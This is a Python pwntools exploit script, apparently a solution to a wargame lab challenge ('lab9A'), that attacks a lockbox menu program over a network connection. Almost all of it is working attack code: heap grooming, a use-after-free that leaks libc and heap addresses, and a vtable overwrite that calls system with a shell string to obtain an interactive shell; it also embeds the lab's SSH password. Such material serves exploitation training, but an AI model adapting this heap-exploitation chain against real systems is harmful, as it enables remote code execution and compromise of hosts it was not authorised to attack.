#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 172.17.46.163 --user lab9A --pass 1_th0uGht_th4t_w4rn1ng_wa5_l4m3 --path /levels/lab09/lab9A
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('lab9A')
context.terminal = '/bin/bash'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '172.17.46.167'
port = int(args.PORT or 22)
user = args.USER or 'lab9A'
password = args.PASSWORD or '1_th0uGht_th4t_w4rn1ng_wa5_l4m3'
remote_path = '/levels/lab09/lab9A'

# Connect to the remote SSH server
shell = None
#if not args.LOCAL:
#    shell = ssh(user, host, port, password)
#    shell.set_working_directory(symlink=True)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Execute the target binary on the remote host'''
    if args.GDB:
        return gdb.debug([remote_path] + argv, gdbscript=gdbscript, ssh=shell, *a, **kw)
    else:
        #return shell.process([remote_path] + argv, *a, **kw)
        return connect(host,port)

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

SMALLBIN_BOXSIZE = 16

def create_box(t, id, size):
    t.sendlineafter("Enter choice:", "1")
    t.sendlineafter("Which lockbox do you want?:", "%d" % id)
    t.sendlineafter("How many items will you store?:", "%d" % size)
    
def get_value(t, id, val):
    t.sendlineafter("Enter choice:", "3")
    t.sendlineafter("Which lockbox?:", "%d" % id)
    t.sendlineafter("Item value:", "%d" % val)
    t.recvuntil(" = ")
    return int(t.readline().strip())
    
def write_value(t, id, val):
    t.sendlineafter("Enter choice:", "2")
    t.sendlineafter("Which lockbox?:", "%d" % id)
    t.sendlineafter("Item value:", "%d" % val)
    
def print_box(t, id, size):
    print "box #%d" % id
    print "+" * 25
    for i in range(0, size):
        t.sendlineafter("Enter choice:", "3")
        t.sendlineafter("Which lockbox?:", "%d" % id)
        t.sendlineafter("Item value:", "%d" % i)
        t.recvuntil(" = ")
        val = get_value(t, id, i)
        print "*\t%d:\t%d\t%s" % (i, val, hex(val & 0xffffffff))
    print

def delete_box(t, id):
    t.sendlineafter("Enter choice:", "4")
    t.sendlineafter("Which set?:", "%d" % id)
    
    
SHELL_OFFSET = 0x49a2c
SYSTEM_OFFSET = 0x16a2bf

libc_base = None
heap_base = None
    
io = start()

log.info("reusing box 1's control chunk as box 2's data chunk")

p = log.progress("grooming the heap...")
create_box(io, 0, 4)
create_box(io, 1, SMALLBIN_BOXSIZE)
create_box(io, 2, 4)
p.success("done")

p = log.progress("leaking libc address from smallbin...: ")
delete_box(io, 1)
create_box(io, 3, SMALLBIN_BOXSIZE)

libc_base = get_value(io, 3, 0)
p.success(hex(libc_base & 0xffffffff))

p = log.progress("leaking heap address from fastbin...: ")
delete_box(io, 0)
delete_box(io, 2)

create_box(io, 4, 4)

heap_base = get_value(io, 4, 0)
p.success(hex(heap_base & 0xfffffff))

write_value(io, 4, libc_base-SYSTEM_OFFSET)

log.info('overwriting vtable')
delete_box(io, 4)

log.info('triggering exploit...')
io.sendlineafter("Enter choice:", "3")
io.sendlineafter("Which lockbox?:", "4")
io.sendlineafter("Item value:", "%d" % (libc_base-SHELL_OFFSET))



# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()

